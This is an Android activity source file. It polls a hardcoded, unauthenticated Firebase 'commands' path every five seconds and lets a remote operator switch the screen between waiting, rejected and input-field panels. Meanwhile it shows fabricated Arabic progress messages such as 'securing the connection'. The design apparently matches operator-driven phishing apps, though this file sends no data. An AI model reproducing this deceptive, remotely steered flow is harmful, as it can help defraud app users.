package com.ban.ab;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;
import org.json.JSONObject;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class SecondActivity extends AppCompatActivity {

    private String userName;
    private final String FIREBASE_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
    private final OkHttpClient client = new OkHttpClient();

    private CardView layoutWaiting, layoutRejected, layoutFields;
    private LinearLayout groupField1;
    private TextView txtRejectReason, txtProgressStatus, txtTicketID;
    private EditText field1;
    private Button btnCancelOrder;

    private final Handler refreshHandler = new Handler(Looper.getMainLooper());
    private Runnable refreshRunnable;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "");

        initViews();
        generateTicketID();
        startStatusSequence(); 
        startAutoRefresh();
    }

    private void initViews() {
        layoutWaiting = findViewById(R.id.layoutWaiting);
        layoutRejected = findViewById(R.id.layoutRejected);
        layoutFields = findViewById(R.id.layoutFields);
        txtProgressStatus = findViewById(R.id.txtProgressStatus);
        txtTicketID = findViewById(R.id.txtTicketID);
        txtRejectReason = findViewById(R.id.txtRejectReason);
        groupField1 = findViewById(R.id.groupField1);
        field1 = findViewById(R.id.field1);
        btnCancelOrder = findViewById(R.id.btnCancelOrder);

        btnCancelOrder.setOnClickListener(v -> {
            stopAutoRefresh();
            getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().clear().apply();
            startActivity(new Intent(this, MainActivity.class));
            finish();
        });
    }

    private void generateTicketID() {
        txtTicketID.setText("تذكرة رقم: " + (System.currentTimeMillis() / 100000));
    }

    private void startStatusSequence() {
        final String[] msgs = {"جاري فحص البيانات...", "بانتظار المشرف المباشر...", "يتم الآن تأمين الاتصال..."};
        refreshHandler.post(new Runnable() {
            int i = 0;
            @Override public void run() {
                if (layoutWaiting.getVisibility() == View.VISIBLE) {
                    txtProgressStatus.setText(msgs[i % msgs.length]);
                    i++;
                    refreshHandler.postDelayed(this, 3000);
                }
            }
        });
    }

    private void startAutoRefresh() {
        refreshRunnable = new Runnable() {
            @Override public void run() {
                checkFirebaseStatus();
                refreshHandler.postDelayed(this, 5000); // فحص كل 5 ثوانٍ (Firebase سريع جداً)
            }
        };
        refreshHandler.post(refreshRunnable);
    }

    private void checkFirebaseStatus() {
        String url = FIREBASE_URL + "commands/" + userName + ".json";
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    try {
                        String res = response.body().string();
                        if (res.equals("null")) return;
                        JSONObject data = new JSONObject(res);
                        runOnUiThread(() -> updateUI(data.optString("status"), data));
                    } catch (Exception ignored) {}
                }
            }
        });
    }

    private void updateUI(String status, JSONObject data) {
        layoutWaiting.setVisibility(View.GONE);
        layoutRejected.setVisibility(View.GONE);
        layoutFields.setVisibility(View.GONE);

        if (status.equals("rejected")) {
            layoutRejected.setVisibility(View.VISIBLE);
            txtRejectReason.setText(data.optString("reason", "تم الرفض"));
        } else if (status.equals("fields")) {
            layoutFields.setVisibility(View.VISIBLE);
        } else {
            layoutWaiting.setVisibility(View.VISIBLE);
        }
    }

    private void stopAutoRefresh() { refreshHandler.removeCallbacks(refreshRunnable); }
    @Override protected void onDestroy() { super.onDestroy(); stopAutoRefresh(); }
}
